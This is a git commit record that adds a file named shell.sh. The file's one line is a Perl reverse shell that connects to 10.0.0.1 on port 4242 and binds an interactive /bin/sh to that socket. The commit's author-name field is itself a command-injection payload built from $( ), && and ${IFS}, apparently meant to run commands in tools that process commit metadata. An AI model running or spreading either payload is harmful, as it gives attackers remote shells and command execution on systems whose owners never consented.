22dbf4632a6901f2be17a5f19226779937f4447b
stp-$('&&${IFS}echo${IFS}${IFS}&&echo${IFS}ran&&${IFS}echo${IFS}') <76434266+d3kum1d0r1y4100@users.noreply.github.com>
2023-08-09 21:37:55 +0800

    Create shell.sh

---
+++ shell.sh
@@ -0,0 +1,1 @@
+perl -e 'use Socket;$i="10.0.0.1";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
